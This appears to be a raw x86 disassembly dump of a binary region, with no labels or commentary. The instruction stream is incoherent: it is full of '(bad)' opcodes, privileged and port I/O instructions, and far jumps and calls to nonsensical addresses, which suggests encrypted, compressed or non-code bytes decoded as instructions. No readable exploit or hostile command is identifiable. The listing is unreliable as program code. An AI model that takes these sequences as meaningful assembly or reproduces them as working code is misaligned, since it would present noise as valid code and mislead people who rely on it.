  40953e:	(bad)  
  40953f:	retf   0xd1d4
  409542:	mov    ah,0xb4
  409544:	clc    
  409545:	std    
  409546:	out    dx,eax
  409547:	test   dl,0xe6
  40954a:	out    0xdf,eax
  40954c:	rol    eax,cl
  40954e:	leave  
  40954f:	add    BYTE PTR [esp+edi*4],al
  409552:	stc    
  409553:	std    
  409554:	or     esi,ecx
  409556:	fmul   st(3),st
  409558:	(bad)  
  409559:	leave  
  40955a:	ret    
  40955b:	sti    
  40955c:	mov    ah,0xcf
  40955e:	jmp    0xb6107f52
  409563:	sar    dh,cl
  409565:	out    dx,al
  409566:	dec    bh
  409568:	out    dx,al
  409569:	sar    DWORD PTR [edi-0x3c3b211e],0x2
  409570:	call   0xe435879
  409575:	loopne 0x40951f
  409577:	mov    bl,0xac
  409579:	shl    BYTE PTR [esi-0x492c0f0b],1
  40957f:	fdiv   st,st(2)
  409581:	cmc    
  409582:	icebp  
  409583:	out    dx,al
  409584:	(bad)  
  409586:	iret   
  409587:	call   0xfe34934f
  40958c:	fxch   st(2)
  40958e:	sar    edx,0xd7
  409591:	test   dl,0x13
  409594:	pavgb  mm1,mm4
  409597:	int3   
  409598:	les    esi,FWORD PTR [ebx-0x3a052833]
  40959e:	(bad)  
  40959f:	mov    edx,0xdbcbb5f4
  4095a4:	icebp  
  4095a5:	clc    
  4095a6:	ret    0xfcec
  4095a9:	fcom   st(3)
  4095ab:	lock fcmovbe st,st(0)
  4095ae:	retf   0xe6e8
  4095b1:	add    al,0xe7
  4095b3:	enter  0xf9fb,0xc1
  4095b7:	mov    bl,0xce
  4095b9:	out    dx,al
  4095ba:	cmc    
  4095bb:	retf   0xc1eb
  4095be:	mov    ebx,0xefb7b0eb
  4095c3:	repz clc 
  4095c5:	sti    
  4095c6:	int3   
  4095c7:	lock repnz (bad) 
  4095cb:	rol    al,1
  4095cd:	(bad)  
  4095ce:	(bad)  
  4095cf:	cmc    
  4095d0:	loop   0x4095d9
  4095d2:	(bad)  
  4095d3:	jmp    0xc72c84b8
  4095d8:	loop   0x409598
  4095da:	jmp    0xda0c42ae
  4095df:	(bad)  
  4095e0:	mov    eax,0xc3f2ddf8
  4095e5:	jmp    0xf9e2:0xd3f3dec1
  4095ec:	mov    ebp,0x6d9e1e9
  4095f1:	pop    es
  4095f2:	fmul   QWORD PTR [edx]
  4095f4:	fadd   DWORD PTR [eax]
  4095f6:	rol    esp,0xa9
  4095f9:	int3   
  4095fa:	jmp    0x4095f0
  4095fc:	sti    
  4095fd:	test   ebp,0xfdc9f0f2
  409603:	fsubp  st(4),st
  409605:	(bad)  
  409607:	inc    eax
  409609:	into   
  40960a:	out    0xd7,eax
  40960c:	aam    0xe4
  40960e:	jmp    0x409607
  409610:	pmulhw mm5,mm0
  409613:	pop    es
  409614:	fyl2x  
  409616:	sar    BYTE PTR [esi-0x5149395b],1
  40961c:	out    0xf4,al
  40961e:	in     eax,dx
  40961f:	sti    
  409620:	aad    0xbf
  409622:	clc    
  409623:	int3   
  409624:	cmc    
  409625:	ffreep st(2)
  409627:	rcr    eax,0xc0
  40962a:	out    0x2,eax
  40962c:	cli    
  40962d:	loope  0x4095f3
  40962f:	in     eax,0xe
  409631:	fdivp  st(6),st
  409633:	fdivp  st(4),st
  409635:	adc    eax,edx
  409637:	lods   al,BYTE PTR ds:[esi]
  409638:	leave  
  409639:	loope  0x4095fd
  40963b:	sti    
  40963c:	fcmovnb st,st(7)
  40963e:	mov    ecx,0xcdcbc5ce
  409643:	mov    ecx,0xc1f2eaf1
  409648:	out    0xcd,al
  40964a:	sti    
  40964b:	int3   
  40964c:	add    ebp,edx
  40964e:	lock or esp,esp
  409651:	out    0xc9,eax
  409653:	cli    
  409654:	or     ecx,DWORD PTR [edi]
  409656:	enter  0xc1c9,0xe9
  40965a:	mov    dl,0xf7
  40965c:	ret    0xf6b6
  40965f:	repnz retf 0xd8da
  409663:	add    eax,ebx
  409665:	mov    ah,0xd5
  409667:	enter  0xdee2,0x0
  40966b:	cmc    
  40966c:	fdiv   st(3),st
  40966e:	add    ebp,edi
  409670:	cmc    
  409671:	push   es
  409672:	(bad)  
  409673:	cld    
  409674:	int    0xcb
  409676:	retf   0xc0ac
  409679:	aad    0xe7
  40967b:	loopne 0x40964f
  40967d:	aad    0xd5
  40967f:	scas   al,BYTE PTR es:[edi]
  409680:	(bad)  
  409682:	enter  0xd1f3,0xd7
  409686:	loopne 0x409687
  409688:	aad    0xe7
  40968a:	rol    BYTE PTR [ebx],1
  40968c:	jecxz  0x409680
  40968e:	fcmovnu st,st(0)
  409690:	add    esp,eax
  409692:	push   es
  409693:	push   es
  409694:	or     al,0x11
  409696:	stos   BYTE PTR es:[edi],al
  409697:	fidiv  WORD PTR [edx-0x3a101f3b]
  40969d:	out    0xb2,al
  40969f:	into   
  4096a0:	cli    
  4096a1:	(bad)  
  4096a3:	aam    0xd8
  4096a5:	mov    ah,0xd9
  4096a7:	neg    bl
  4096a9:	pop    es
  4096aa:	fadd   st,st(5)
  4096ac:	(bad)  
  4096ad:	aad    0xdb
  4096af:	loopne 0x4096a6
  4096b1:	(bad)  
  4096b2:	hlt    
  4096b3:	int3   
  4096b4:	out    0xe9,al
  4096b6:	rcr    esi,cl
  4096b8:	int3   
  4096b9:	mov    cl,0xf1
  4096bb:	mul    esi
  4096bd:	div    dh
  4096bf:	mov    dh,0xd0
  4096c1:	mov    ch,0xc4
  4096c3:	add    esi,ebp
  4096c5:	idiv   DWORD PTR [ecx-0xd22052f]
  4096cb:	faddp  st(0),st
  4096cd:	rol    BYTE PTR [ebx],cl
  4096cf:	out    0xdd,eax
  4096d1:	or     ebp,ebx
  4096d3:	(bad)  
  4096d5:	out    0xc3,al
  4096d7:	retf   0xc0bc
  4096da:	(bad)  
  4096db:	iret   
  4096dc:	xlat   BYTE PTR ds:[ebx]
  4096dd:	in     eax,0xc5
  4096df:	iret   
  4096e0:	jmp    0x4096d9
  4096e2:	int3   
  4096e3:	sar    BYTE PTR [edi-0xf42360f],1
  4096e9:	loop   0x4096c7
  4096eb:	ret    0xf6f4
  4096ee:	test   DWORD PTR [ebx],0xc90de200
  4096f4:	sti    
  4096f5:	loopne 0x4096b7
  4096f7:	jmp    0xeac3:0xf4d2e8bf
  4096fe:	(bad)
  409701:	lock mov ah,0xba
  409704:	ror    al,cl
  409706:	mov    edx,0xd7d1cef3
  40970b:	rol    ah,0xd6
  40970e:	(bad)  
  40970f:	call   0xd03c65f1
  409714:	iret   
  409715:	clc    
  409716:	in     al,dx
  409717:	lock scas eax,DWORD PTR es:[edi]
  409719:	in     al,0xc6
  40971b:	mov    ah,0xe5
  40971d:	retf   
  40971e:	mov    bl,0xd6
  409720:	sar    DWORD PTR [ebx-0x2746122f],cl
  409726:	leave  
  409727:	add    ah,bl
  409729:	repnz mov esi,0xdcf6c4c3
  40972f:	pop    es
  409730:	enter  0xf9d9,0xd4
  409734:	add    ecx,ebx
  409736:	jecxz  0x40971a
  409738:	out    0xa8,eax
  40973a:	retf   0xd0ed
  40973d:	out    0xd2,eax
  40973f:	in     eax,0xf1
  409741:	lods   al,BYTE PTR ds:[esi]
  409742:	stc    
  409743:	in     al,0xec
  409745:	imul   ah
  409747:	mov    esp,0xbdc2c003
  40974c:	stc    
  40974d:	std    
  40974e:	rcr    esp,1
  409750:	enter  0xdfe0,0xd4
  409754:	add    dh,ch
  409756:	scas   al,BYTE PTR es:[edi]
  409757:	loope  0x40974c
  409759:	in     eax,0xb6
  40975b:	ret    0xf3b2
  40975e:	shr    esi,1
  409760:	retf   0xf0e4
  409763:	shl    dl,cl
  409765:	xlat   BYTE PTR ds:[ebx]
  409766:	mov    eax,0xbeb406bf
  40976b:	fadd   st(6),st
  40976d:	dec    DWORD PTR [eax]
  40976f:	call   0xce2f863c
  409774:	in     eax,0x5
  409776:	ret    0xe0c8
  409779:	repz jmp 0xadf0:0xd6d4e9f5
  409781:	fcmove st,st(6)
  409783:	sar    BYTE PTR [edi-0x28124009],cl
  409789:	clc    
  40978a:	inc    BYTE PTR [eax]
  40978c:	aad    0xf6
  40978e:	sar    bl,1
  409790:	jmp    0xd2f8:0xf9daedc5
  409797:	jmp    0x409741
  409799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40979a:	mov    bh,0xb6
  40979c:	cmc    
  40979d:	div    dh
  40979f:	ror    esp,1
  4097a1:	int    0xce
  4097a3:	mov    ch,0xd9
  4097a5:	repnz fdiv st(6),st
  4097a8:	inc    dh
  4097aa:	int3   
  4097ab:	ror    BYTE PTR [ebx],1
  4097ad:	cli    
  4097ae:	in     al,0xfa
  4097b0:	(bad)  
  4097b1:	leave  
  4097b2:	fsubr  st,st(1)
  4097b4:	sti    
  4097b5:	std    
  4097b6:	rol    dl,cl
  4097b8:	loope  0x4097a9
  4097ba:	(bad)  
  4097bb:	test   ebx,0xe6daccd9
  4097c1:	out    0xbd,al
  4097c3:	cld    
  4097c4:	mov    eax,0xecf1f8ba
  4097c9:	neg    edi
  4097cb:	sar    DWORD PTR [ecx-0x3f08fdfb],0xfa
  4097d2:	retf   
  4097d3:	cld    
  4097d4:	int3   
  4097d5:	in     eax,0xd9
  4097d7:	in     eax,dx
  4097d8:	idiv   DWORD PTR [ebp-0x1d0a293b]
  4097de:	loopne 0x4097a0
  4097e0:	sti    
  4097e1:	fnsave [ebx-0x2f161718]
  4097e7:	add    dh,bl
  4097e9:	cmc    
  4097ea:	repz loope 0x4097d7
  4097ed:	pop    es
  4097ee:	cmc    
  4097ef:	or     bl,ah
  4097f1:	loop   0x4097c8
  4097f3:	(bad)  
  4097f4:	enter  0xf2d9,0xe0
  4097f8:	lods   eax,DWORD PTR ds:[esi]
  4097f9:	enter  0xf7c6,0xc1
  4097fd:	iret   
  4097fe:	clc    
  4097ff:	iret   
  409800:	enter  0xd3e8,0xbd
  409804:	repnz repnz fnstsw WORD PTR [ecx-0x7240125]
  40980c:	ret    
  40980d:	icebp  
  40980e:	fnop   
  409810:	fucomi st,st(6)
  409812:	into   
  409813:	out    dx,eax
  409814:	or     ecx,DWORD PTR [edx]
  409816:	repz repnz repnz shl ebp,0xf3
  40981c:	loopne 0x4097f0
  40981e:	(bad)  
  40981f:	mov    eax,0xcab8e4ff
  409824:	fiadd  WORD PTR [ebx]
  409826:	std    
  409827:	cmc    
  409828:	(bad)  
  409829:	(bad)  
  40982b:	not    esp
  40982d:	(bad)  
  40982e:	cld    
  40982f:	call   0xe5069f31
  409834:	add    al,0xc
  409836:	ret    
  409837:	mov    cl,0xbe
  409839:	(bad)
  40983c:	mov    bh,0xee
  40983e:	sti    
  40983f:	jmp    0x4097f7
  409841:	clc    
  409842:	retf   0xd5b8
  409845:	add    esp,ebx
  409847:	sti    
  409848:	fxch   st(4)
  40984a:	sti    
  40984b:	loope  0x409826
  40984d:	fadd   QWORD PTR [ecx]
  40984f:	jmp    0x40983b
  409851:	add    esi,edi
  409853:	mov    BYTE PTR [eax],0xf3
  409856:	ret    
  409857:	shr    DWORD PTR [eax-0x161b4d5c],0xeb
  40985e:	mov    ecx,0xcdeef5b4
  409863:	(bad)  
  409865:	mov    ebx,0xbfeff602
  40986a:	shl    dl,cl
  40986c:	aam    0xe1
  40986e:	aam    0xc4
  409870:	iret   
  409871:	cli    
  409872:	sti    
  409873:	fst    DWORD PTR [edx]
  409875:	cli    
  409876:	stos   BYTE PTR es:[edi],al
  409877:	mov    esp,0xf5f3b6cd
  40987c:	(bad)  [edx-0x2b392b27]
  409882:	repz lock lock mov ecx,0xd2b9beef
  40988a:	hlt    
  40988b:	clc    
  40988c:	(bad)  
  40988d:	test   BYTE PTR [edx],0xb
  409890:	(bad)  
  409891:	cmc    
  409892:	add    ebp,edi
  409894:	clc    
  409895:	loopne 0x409876
  409897:	fsubrp st(7),st
  409899:	(bad)
  40989c:	int3   
  40989d:	hlt    
  40989e:	mov    dh,0xc8
  4098a0:	icebp  
  4098a1:	(bad)  
  4098a3:	enter  0xb8b9,0x1
  4098a7:	shr    esi,1
  4098a9:	out    dx,al
  4098aa:	aad    0x3
  4098ac:	add    esp,esp
  4098ae:	icebp  
  4098af:	rcr    bh,1
  4098b1:	aad    0xca
  4098b3:	cli    
  4098b4:	jmp    0xd4d0:0xe5c4a7dc
  4098bb:	aam    0xcf
  4098bd:	retf   
  4098be:	out    dx,eax
  4098bf:	(bad)  
  4098c0:	cli    
  4098c1:	mov    bh,0xfa
  4098c3:	(bad)  
  4098c5:	(bad)  
  4098c6:	shl    dh,cl
  4098c8:	shl    eax,1
  4098ca:	aad    0x2
  4098cc:	std    
  4098cd:	or     ebx,ebp
  4098cf:	add    bh,al
  4098d1:	(bad)  
  4098d2:	psubq  mm4,mm3
  4098d5:	out    0xbc,eax
  4098d7:	fsubrp st(7),st
  4098d9:	out    0xec,al
  4098db:	jmp    0xccf3:0xd1c6d0d7
  4098e2:	aad    0xfa
  4098e4:	into   
  4098e5:	add    esi,esp
  4098e7:	mov    ecx,0xfad102ed
  4098ec:	shl    esi,1
  4098ee:	icebp  
  4098ef:	mul    dl
  4098f1:	out    dx,al
  4098f2:	add    eax,0xb3fcea04
  4098f7:	iret   
  4098f8:	in     eax,0xc1
  4098fa:	lock les esi,FWORD PTR [esi-0x5103f18]
  409901:	call   0x23b82cb
  409906:	add    edi,DWORD PTR [esi+esi*8-0xe2a4121]
  40990d:	or     cl,dl
  40990f:	rcr    dl,0xd8
  409912:	out    dx,al
  409913:	jmp    0xcd0e7d1f
  409918:	loop   0x4098d1
  40991a:	in     eax,0xaa
  40991c:	rol    al,cl
  40991e:	call   0xd03b6818
  409923:	rcr    esp,1
  409925:	iret   
  409926:	jmp    0xe5229923
  40992b:	(bad)  
  40992c:	fdivr  QWORD PTR [eax+0x8d5dcfb]
  409932:	(bad)  
  409933:	in     eax,0xf
  409935:	in     eax,dx
  409936:	out    0xaa,eax
  409938:	retf   
  409939:	mov    esi,0xe8dbcdc4
  40993e:	repz in eax,0xf3
  409941:	lock repz int3 
  409944:	clc    
  409945:	aam    0xdb
  409947:	ret    0xd0d7
  40994a:	cld    
  40994b:	mov    esp,0xcaf6d4cb
  409950:	or     ebp,edx
  409952:	clc    
  409953:	fadd   DWORD PTR [edx]
  409955:	out    dx,eax
  409956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409958:	repz loop 0x40994a
  40995b:	cmc    
  40995c:	int3   
  40995d:	mov    bh,0xc4
  40995f:	into   
  409960:	icebp  
  409961:	cli    
  409962:	retf   0xc8e9
  409965:	cld    
  409966:	fndisi(8087 only) 
  409968:	loop   0x40993d
  40996a:	mov    DWORD PTR [edi],0xf0f7d7e1
  409970:	add    al,0xed
  409972:	loop   0x409940
  409974:	in     al,dx
  409975:	out    dx,al
  409976:	lods   al,BYTE PTR ds:[esi]
  409977:	retf   
  409978:	out    0xa4,al
  40997a:	icebp  
  40997b:	imul   eax
  40997d:	mul    eax
  40997f:	mov    ah,0xcd
  409981:	aad    0xb4
  409983:	int3   
  409984:	cld    
  409985:	fcmovnbe st,st(1)
  409987:	out    dx,al
  409988:	hlt    
  409989:	aam    0xd4
  40998b:	repnz lock add dh,cl
  40998f:	enter  0xe7ef,0xf5
  409993:	into   
  409994:	shr    esi,0xbe
  409997:	shr    esi,cl
  409999:	jecxz  0x409962
  40999b:	aam    0xc4
  40999d:	mov    cl,0xd0
  40999f:	mov    esi,0xe8cee9f8
  4099a5:	aad    0xba
  4099a7:	(bad)  
  4099a9:	fcmovbe st,st(1)
  4099ab:	loopne 0x40997e
  4099ad:	jmp    0xdceb:0xfdbddff5
  4099b4:	adc    al,BYTE PTR ds:0xc6ceafaa
  4099ba:	ret    
  4099bb:	mov    cl,0xfb
  4099bd:	repz mov dl,0xc8
  4099c0:	fidivr WORD PTR [esi-0xa440b1b]
  4099c6:	cmc    
  4099c7:	pop    es
  4099c8:	rol    DWORD PTR [eax],cl
  4099ca:	mov    edi,0xc9e500cc
  4099cf:	clc    
  4099d0:	loope  0x4099d4
  4099d2:	in     al,0xc9
  4099d4:	iret   
  4099d5:	repz loop 0x4099a3
  4099d8:	scas   eax,DWORD PTR es:[edi]
  4099d9:	scas   eax,DWORD PTR es:[edi]
  4099da:	lods   al,BYTE PTR ds:[esi]
  4099db:	retf   0xcfb4
  4099de:	shl    ecx,1
  4099e0:	mov    edx,0xf8f0cdca
  4099e5:	enter  0xc1e0,0xd6
  4099e9:	mov    ebp,0xb8d90200
  4099ee:	ret    
  4099ef:	paddd  mm0,mm4
  4099f2:	out    0xe6,eax
  4099f4:	(bad)  
  4099f5:	loopne 0x4099a5
  4099f7:	ror    al,cl
  4099f9:	mov    dh,0xd1
  4099fb:	(bad)  
  4099fc:	(bad)  
  4099fd:	aad    0xc8
  4099ff:	xlat   BYTE PTR ds:[ebx]
  409a00:	call   0xfa3a85d4
  409a05:	idiv   DWORD PTR [edx+edi*8-0x31247]
  409a0c:	jmp    0xdd06:0xc0ef06fa
  409a13:	jmp    0x409a23
  409a15:	into   
  409a16:	shl    DWORD PTR [eax-0x4a183658],cl
  409a1c:	int    0xef
  409a1e:	out    dx,eax
  409a1f:	out    dx,eax
  409a20:	stc    
  409a21:	sti    
  409a22:	mov    bh,0xd0
  409a24:	icebp  
  409a25:	lock clc 
  409a27:	enter  0xd4ed,0x6
  409a2b:	add    eax,0xe2fce9e6
  409a30:	jmp    0xa80c:0xe8e400cf
  409a37:	int3   
  409a38:	(bad)  
  409a3a:	into   
  409a3b:	in     eax,0xdb
  409a3d:	sti    
  409a3e:	jmp    0x409a33
  409a40:	int    0xeb
  409a42:	mov    eax,0xe3d6ffd5
  409a47:	fcmovnu st,st(4)
  409a49:	(bad)  
  409a4a:	mov    ebp,0xe7f0dff0
  409a4f:	neg    ecx
  409a51:	add    bh,al
  409a53:	cli    
  409a54:	iret   
  409a55:	(bad)  
  409a57:	iret   
  409a58:	int3   
  409a59:	shl    BYTE PTR [ebp-0x2e2e0c52],1
  409a5f:	lock lock int 0xdf
  409a63:	fcmovnb st,st(3)
  409a65:	fdivrp st(2),st
  409a67:	stc    
  409a68:	rcr    ebx,cl
  409a6a:	loop   0x409a2d
  409a6c:	in     al,0xc3
  409a6e:	stc    
  409a6f:	rol    DWORD PTR [ebx],0xfd
  409a72:	loopne 0x409a7e
  409a74:	in     eax,dx
  409a75:	add    ah,cl
  409a77:	out    dx,eax
  409a78:	in     eax,0xf0
  409a7a:	mov    ch,0xc7
  409a7c:	(bad)  
  409a7d:	loopne 0x409a43
  409a7f:	retf   
  409a80:	fidivr DWORD PTR [ebx-0x32083437]
  409a86:	fistp  QWORD PTR [ebp-0x43331a43]
  409a8c:	fxch   st(3)
  409a8e:	call   0xf93b665c
  409a93:	adc    esp,esi
  409a95:	ffreep st(3)
  409a97:	(bad)
  409a9a:	jmp    0x409a89
  409a9c:	shl    ecx,0xed
  409a9f:	iret   
  409aa0:	fucomi st,st(7)
  409aa2:	mov    esi,0xe1d4ded7
  409aa7:	std    
  409aa8:	loope  0x409aa9
  409aaa:	int    0xe7
  409aac:	mul    ebx
  409aae:	(bad)  
  409aaf:	(bad)  
  409ab0:	fcmovne st,st(1)
  409ab2:	cld    
  409ab3:	fcomi  st,st(2)
  409ab5:	clc    
  409ab6:	jecxz  0x409a94
  409ab8:	jmp    0xf20a63b4
  409abd:	(bad)  
  409abe:	mov    edx,0xd4d6c9f2
  409ac3:	icebp  
  409ac4:	in     al,dx
  409ac5:	(bad)  
  409ac7:	sar    BYTE PTR [ebx+edx*8-0x473d3a2d],0xeb
  409acf:	fmul   DWORD PTR [ecx]
  409ad1:	clc    
  409ad2:	jmp    0x409aa1
  409ad4:	pop    es
  409ad5:	add    edx,esp
  409ad7:	mov    cl,0xe0
  409ad9:	jecxz  0x409aaa
  409adb:	mov    dh,0xf2
  409add:	mov    al,0xdb
  409adf:	out    dx,al
  409ae0:	clc    
  409ae1:	mov    ebx,0xede8b2ff
  409ae6:	loop   0x409aa6
  409ae8:	(bad)  
  409ae9:	aad    0x1
  409aeb:	ret    0xfdfe
  409aee:	retf   0xcfd5
  409af1:	or     al,BYTE PTR ds:0xc2eec5e4
  409af7:	mov    al,0xc9
  409af9:	div    BYTE PTR [esi-0x492f1c3e]
  409aff:	(bad)  
  409b00:	call   0xf81286b5
  409b05:	rcl    bl,cl
  409b07:	loop   0x409add
  409b09:	cli    
  409b0a:	stc    
  409b0b:	shl    ch,1
  409b0d:	add    dh,ch
  409b0f:	xlat   BYTE PTR ds:[ebx]
  409b10:	(bad)  
  409b11:	fsub   st(7),st
  409b13:	fmul   st(4),st
  409b15:	out    dx,eax
  409b16:	in     eax,0xe3
  409b18:	leave  
  409b19:	jmp    0xb42d6cfe
  409b1e:	rol    dh,0xde
  409b21:	out    dx,al
  409b22:	fidiv  DWORD PTR [ebp-0x6333346]
  409b28:	aad    0x2
  409b2a:	push   es
  409b2b:	add    al,0xea
  409b2d:	jmp    0xcbdc:0xefddffd4
  409b34:	adc    esp,edi
  409b36:	scas   eax,DWORD PTR es:[edi]
  409b37:	imul   esi
  409b39:	iret   
  409b3a:	jmp    0xd8ce:0xbae2e3cb
  409b41:	icebp  
  409b42:	int    0xcf
  409b44:	int3   
  409b45:	add    eax,edx
  409b47:	fdivr  QWORD PTR [edi+0x6c7d0fd]
  409b4d:	ret    0xf4d0
  409b50:	out    dx,al
  409b51:	aad    0x0
  409b53:	or     al,0xdb
  409b55:	push   es
  409b56:	retf   
  409b57:	fisubr WORD PTR [esi-0x910134e]
  409b5d:	leave  
  409b5e:	scas   eax,DWORD PTR es:[edi]
  409b5f:	icebp  
  409b60:	(bad)  
  409b61:	jmp    0xf9cd:0x2e8f5d2
  409b68:	(bad)  
  409b6a:	ret    
  409b6b:	(bad)  
  409b6c:	cld    
  409b6d:	clc    
  409b6e:	push   es
  409b6f:	or     ebx,ebp
  409b71:	(bad)  
  409b72:	fisttp DWORD PTR [edi]
  409b74:	int    0xe2
  409b76:	mov    ecx,0xddcbd2c1
  409b7b:	mov    al,0xc5
  409b7d:	sar    ecx,1
  409b7f:	jmp    0xefb1:0xd2bae5ce
  409b86:	std    
  409b87:	cli    
  409b88:	rol    BYTE PTR [edx],0xfb
  409b8b:	std    
  409b8c:	or     esi,ecx
  409b8e:	fprem  
  409b90:	(bad)  
  409b92:	mov    ah,0x9
  409b95:	cli    
  409b96:	int3   
  409b97:	out    0xe8,al
  409b99:	retf   
  409b9a:	test   bh,0xe8
  409b9d:	iret   
  409b9e:	(bad)  
  409b9f:	stc    
  409ba0:	test   al,0xec
  409ba3:	mov    ebp,0xf2c1f7f0
  409ba8:	add    dh,dh
  409baa:	mov    edi,0xf5bcd4
  409baf:	sysret 
  409bb1:	(bad)  
  409bb2:	add    DWORD PTR [eax],ecx
  409bb4:	push   es
  409bb5:	out    0xab,al
  409bb7:	mov    edi,0xe7caa8c8
  409bbc:	cli    
  409bbd:	mov    ebx,0xf7cbd8ee
  409bc2:	in     eax,0xee
  409bc4:	mov    esp,0xbfd4f8b0
  409bc9:	stc    
  409bca:	fucomip st,st(4)
  409bcc:	retf   
  409bcd:	sti    
  409bce:	or     eax,DWORD PTR [esi+eiz*8]
  409bd1:	hlt    
  409bd2:	loope  0x409ba1
  409bd4:	loopne 0x409bb7
  409bd6:	out    dx,al
  409bd7:	(bad)
  409bda:	mov    bh,0xc5
  409bdc:	(bad)  
  409bde:	out    dx,eax
  409bdf:	(bad)  
  409be1:	fsubp  st(4),st
  409be3:	mov    edx,0xd7bae1bc
  409be8:	out    0xbd,al
  409bea:	out    0xc3,al
  409bec:	(bad)  
  409bee:	or     esi,esp
  409bf0:	cmc    
  409bf1:	bswap  esi
  409bf3:	jmp    0xb6c8:0xdde2fce8
  409bfa:	mov    dh,0xe8
  409bfc:	fcmovnb st,st(4)
  409bfe:	clc    
  409bff:	fmul   st,st(4)
  409c01:	fbstp  TBYTE PTR [edi-0x12214a27]
  409c07:	mov    dh,0xd1
  409c09:	out    dx,al
  409c0a:	add    eax,0xcaf10a01
  409c0f:	in     al,0xff
  409c11:	loope  0x409c14
  409c13:	clc    
  409c14:	std    
  409c15:	or     ecx,edx
  409c17:	icebp  
  409c18:	les    esi,FWORD PTR [edx-0xb08431e]
  409c1e:	in     eax,0xb5
  409c20:	int3   
  409c21:	(bad)  
  409c22:	(bad)  
  409c23:	in     eax,dx
  409c24:	stc    
  409c25:	mov    ecx,0xb8f0d5b7
  409c2a:	repnz add dl,dl
  409c2d:	mov    eax,0xded9c805
  409c32:	iret   
  409c33:	fimul  DWORD PTR [ecx]
  409c35:	out    dx,eax
  409c36:	(bad)
  409c39:	rol    ah,cl
  409c3b:	mov    cl,0xda
  409c3d:	ret    0xcbd4
  409c40:	repz call 0xb91975f9
  409c46:	cmc    
  409c47:	mov    ebp,0xfdfae0ec
  409c4c:	add    DWORD PTR [edi+edx*8-0x3a1938fe],edi
  409c53:	int    0xdb
  409c55:	in     eax,0xeb
  409c57:	icebp  
  409c58:	(bad)  
  409c59:	mov    ebp,0xc7dab6ab
  409c5e:	jmp    0xe8f2:0xb9ddd3d5
  409c65:	xlat   BYTE PTR ds:[ebx]
  409c66:	cmc    
  409c67:	div    ebx
  409c69:	add    bl,bh
  409c6b:	loopne 0x409c2d
  409c6d:	mov    eax,0xfc00f6e6
  409c72:	jmp    0xcdca:0xeddcfbc8
  409c79:	mov    esi,0xcafbc5ea
  409c7e:	mov    ah,0xb6
  409c80:	cli    
  409c81:	lock mov esi,0xf2b4b8d4
  409c87:	rcr    ch,0xc7
  409c8a:	pop    es
  409c8b:	in     eax,0xd9
  409c8d:	(bad)  
  409c8f:	aam    0xdd
  409c91:	(bad)  
  409c92:	(bad)  
  409c95:	adc    eax,eax
  409c97:	rol    esi,1
  409c99:	not    bl
  409c9b:	repz mov ch,0xe0
  409c9e:	imul   ecx
  409ca0:	sar    BYTE PTR [edi-0x40101418],1
  409ca6:	mov    edx,0xf9cec0c8
  409cab:	fadd   DWORD PTR [edi*8+0xae4e00a]
  409cb2:	stc    
  409cb3:	pmaxsw mm7,mm7
  409cb6:	jecxz  0x409c6a
  409cb8:	iret   
  409cb9:	iret   
  409cba:	leave  
  409cbb:	mov    dh,0xf3
  409cbd:	aam    0xf8
  409cbf:	fdiv   st,st(7)
  409cc1:	mov    ah,0xf7
  409cc3:	(bad)  
  409cc4:	(bad)  
  409cc6:	aam    0xd7
  409cc8:	out    0xc6,al
  409cca:	(bad)  
  409ccb:	(bad)  
  409ccc:	clc    
  409ccd:	sti    
  409cce:	loope  0x409c99
  409cd0:	pop    es
  409cd1:	in     eax,0x8
  409cd3:	sti    
  409cd4:	fmul   st(3),st
  409cd6:	test   al,0xbe
  409cd8:	ret    0xe6e8
  409cdb:	rcl    cl,1
  409cdd:	icebp  
  409cde:	out    dx,eax
  409cdf:	out    0xf8,al
  409ce1:	out    dx,eax
  409ce2:	(bad)  
  409ce4:	lock jmp 0xfcdf:0xf2db07e2
  409cec:	loop   0x409cb1
  409cee:	test   DWORD PTR [eax],0xe30c04ef
  409cf4:	add    BYTE PTR [eax+eax*8],cl
  409cf7:	test   eax,0xc2c5c7d6
  409cfc:	jecxz  0x409cce
  409cfe:	mov    ah,0xed
  409d00:	lock in eax,dx
  409d02:	fxch   st(5)
  409d04:	fcmovnu st,st(6)
  409d06:	fiadd  WORD PTR [edi]
  409d08:	sar    DWORD PTR [ebp-0x40f1840],0xe7
  409d0f:	out    dx,eax
  409d10:	or     BYTE PTR [ebx],al
  409d12:	hlt    
  409d13:	or     eax,0xe9f208d3
  409d18:	out    dx,al
  409d19:	fsubp  st(2),st
  409d1b:	ret    0xb3d3
  409d1e:	cli    
  409d1f:	icebp  
  409d20:	fcomp  st(1)
  409d22:	mov    edi,0xc8c3d3f9
  409d27:	idiv   DWORD PTR [ecx-0x2a0c182d]
  409d2d:	clc    
  409d2e:	pop    es
  409d2f:	retf   0x3
  409d32:	jmp    0x409d02
  409d34:	clc    
  409d35:	pop    es
  409d36:	jmp    0xb2ad:0xf0e4d1e1
  409d3d:	shl    DWORD PTR [ecx+esi*4-0x23373a2e],0xee
  409d45:	jmp    0xdb399b3b
  409d4a:	mov    ebp,0xebc301e3
  409d4f:	cmc    
  409d50:	or     cl,bl
  409d52:	dec    DWORD PTR [edi]
  409d54:	iret   
  409d55:	fsubrp st(1),st
  409d57:	jecxz  0x409d05
  409d59:	test   al,0xe4
  409d5b:	mov    dl,0xe3
  409d5d:	repz mov al,0xc6
  409d60:	fdivr  DWORD PTR [ecx-0xe0b4717]
  409d66:	ret    
  409d67:	sar    DWORD PTR [esi-0x2b2c022a],cl
  409d6d:	in     eax,0xf5
  409d6f:	cld    
  409d70:	fisttp QWORD PTR ds:0x8c4efce
  409d76:	out    dx,eax
  409d77:	rol    dl,cl
  409d79:	mov    bh,0xcf
  409d7b:	shl    DWORD PTR [esi-0x28054d10],0xf7
  409d82:	icebp  
  409d83:	shr    ah,1
  409d85:	stc    
  409d86:	div    ebx
  409d88:	(bad)  
  409d8a:	mov    edi,0xc3e1f2c5
  409d8f:	or     cl,bh
  409d91:	in     al,0x4
  409d93:	clc    
  409d94:	out    0xc,al
  409d96:	stos   DWORD PTR es:[edi],eax
  409d97:	out    0xc2,eax
  409d99:	fadd   st(3),st
  409d9b:	out    0xe5,al
  409d9d:	mov    dl,0xd4
  409d9f:	enter  0xd6e7,0xf9
  409da3:	jmp    0xd6f3:0x1faefcc
  409daa:	int    0xd9
  409dac:	clc    
  409dad:	stc    
  409dae:	pop    es
  409daf:	std    
  409db0:	add    eax,0xc02ffca
  409db5:	sar    DWORD PTR [esi-0x1234424d],cl
  409dbb:	hlt    
  409dbc:	int    0xe2
